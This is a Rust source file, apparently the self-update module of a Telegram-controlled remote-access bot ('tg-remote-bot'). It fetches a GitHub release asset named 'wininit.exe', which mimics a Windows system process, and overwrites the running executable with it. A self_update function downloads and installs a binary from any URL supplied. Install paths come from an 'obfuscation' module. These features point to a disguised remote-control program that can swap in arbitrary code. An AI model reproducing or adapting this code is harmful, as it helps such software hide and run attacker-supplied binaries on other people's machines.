use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use serde_json::Value;

use crate::security::obfuscation;

const GITHUB_API: &str = "https://api.github.com/repos/cecon123/tg-remote-bot/releases/latest";
const GITHUB_ASSET: &str = "wininit.exe";

/// Fetch the latest release JSON from GitHub API.
pub async fn fetch_github_release() -> Result<Value> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .build()?;

    let resp = client
        .get(GITHUB_API)
        .header("User-Agent", "tg-remote-bot")
        .header("Accept", "application/vnd.github+json")
        .send()
        .await
        .context("cannot reach GitHub API")?;

    let resp = resp.error_for_status().context("GitHub API error")?;
    let text = resp.text().await.context("cannot read GitHub response")?;
    serde_json::from_str(&text).context("invalid JSON from GitHub")
}

/// Compare semver strings (major.minor.patch). Returns true if `remote` > `local`.
fn is_newer(remote: &str, local: &str) -> bool {
    let r: Vec<u32> = remote.split('.').filter_map(|s| s.parse().ok()).collect();
    let l: Vec<u32> = local.split('.').filter_map(|s| s.parse().ok()).collect();
    for i in 0..3 {
        let rv = r.get(i).copied().unwrap_or(0);
        let lv = l.get(i).copied().unwrap_or(0);
        if rv != lv {
            return rv > lv;
        }
    }
    false
}

/// Find the download URL for the target asset in a GitHub release body.
fn find_asset_url(body: &Value) -> Result<String> {
    let assets = body["assets"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("no assets in release"))?;

    for asset in assets {
        if asset["name"].as_str() == Some(GITHUB_ASSET) {
            let url = asset["browser_download_url"]
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("no download url"))?;
            return Ok(url.to_string());
        }
    }

    anyhow::bail!("asset '{}' not found in release", GITHUB_ASSET);
}

/// Resolve the download URL for auto-update. Returns None if already up-to-date.
pub async fn resolve_update_url() -> Result<Option<String>> {
    let body = fetch_github_release().await?;
    let tag = body["tag_name"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("no tag_name in release"))?;

    let remote_ver = tag.strip_prefix('v').unwrap_or(tag);
    let local_ver = env!("CARGO_PKG_VERSION");

    if !is_newer(remote_ver, local_ver) {
        return Ok(None);
    }

    log::info!("new version available: {local_ver} -> {remote_ver}");
    let url = find_asset_url(&body)?;
    Ok(Some(url))
}

/// Download a file from `url` to `dest`.
async fn download_file(url: &str, dest: &Path) -> Result<()> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(300))
        .build()?;

    let resp = client
        .get(url)
        .header("User-Agent", "tg-remote-bot")
        .send()
        .await
        .context("download failed")?;

    let resp = resp.error_for_status().context("download HTTP error")?;
    let bytes = resp.bytes().await.context("cannot read download body")?;

    tokio::fs::write(dest, &bytes)
        .await
        .with_context(|| format!("cannot write to {}", dest.display()))?;

    Ok(())
}

/// Swap the current exe with a newly downloaded one, then exit.
/// The old binary is renamed to .old (cleaned up on next startup).
pub async fn apply_update(downloaded: &Path) -> Result<()> {
    let current_exe = std::env::current_exe().context("cannot get current exe path")?;
    let old_path = current_exe.with_extension("old");

    if current_exe.exists() {
        std::fs::rename(&current_exe, &old_path).context("cannot rename current exe to .old")?;
    }

    std::fs::copy(downloaded, &current_exe).context("cannot copy new binary into place")?;
    let _ = std::fs::remove_file(downloaded);

    std::process::exit(0);
}

/// Auto-update: check GitHub, download if newer, swap binary and exit.
pub async fn auto_update() -> Result<bool> {
    let body = match fetch_github_release().await {
        Ok(b) => b,
        Err(e) => {
            log::warn!("version check failed: {e:?}");
            return Ok(false);
        }
    };

    let tag = match body["tag_name"].as_str() {
        Some(t) => t,
        None => return Ok(false),
    };
    let remote_ver = tag.strip_prefix('v').unwrap_or(tag);
    let local_ver = env!("CARGO_PKG_VERSION");

    if !is_newer(remote_ver, local_ver) {
        log::info!("version is up to date ({local_ver})");
        return Ok(false);
    }

    log::info!("new version available: {local_ver} -> {remote_ver}");

    let url = find_asset_url(&body)?;
    let home = obfuscation::install_home();
    let tmp_path = home.join("_update_tmp.exe");

    download_file(&url, &tmp_path).await?;
    apply_update(&tmp_path).await?;

    Ok(true)
}

/// Manual update: download from `url`, swap binary and exit.
pub async fn self_update(url: &str) -> Result<()> {
    let home = obfuscation::install_home();
    let tmp_path = home.join("_update_tmp.exe");

    download_file(url, &tmp_path).await?;
    apply_update(&tmp_path).await?;

    Ok(())
}
